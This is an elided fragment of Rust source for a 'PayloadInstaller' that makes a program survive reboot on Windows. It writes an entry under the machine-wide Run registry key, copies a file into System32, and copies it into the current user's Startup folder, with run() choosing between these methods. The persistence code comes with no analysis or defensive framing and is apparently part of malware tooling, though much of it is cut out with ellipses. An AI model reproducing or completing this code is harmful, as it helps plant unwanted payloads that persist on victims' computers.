...
impl PayloadInstaller
{
    ...
    fn autorun_in_registry(&self, program_path: &str, program_name: &str) -> io::Result<()>
    {
        ...
        let key = hklm.open_subkey_with_flags("Software\\Microsoft\\Windows\\CurrentVersion\\Run", KEY_WRITE).unwrap();
    ...
    fn copy_file_to_startup(&self, program_path: &str, program_name: &str, user_name: &str) -> io::Result<()>
    {
        //Code to copy the program to the startup folder

        let startup_folder = format!("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", user_name);
    ...
    pub fn run(&self) -> io::Result<()>
    {
        ...
        {
            1 => {
                self.autorun_in_registry(format!("{}{}", WINDOWS_SYSTEM32, &program_name).as_str(), &program_name)?;
                self.copy_file_to_system32(&program_to_copy, &program_name)?;
            },

            2 => self.copy_file_to_startup(&program_to_copy, &program_name, &aux.get_current_user_name())?,
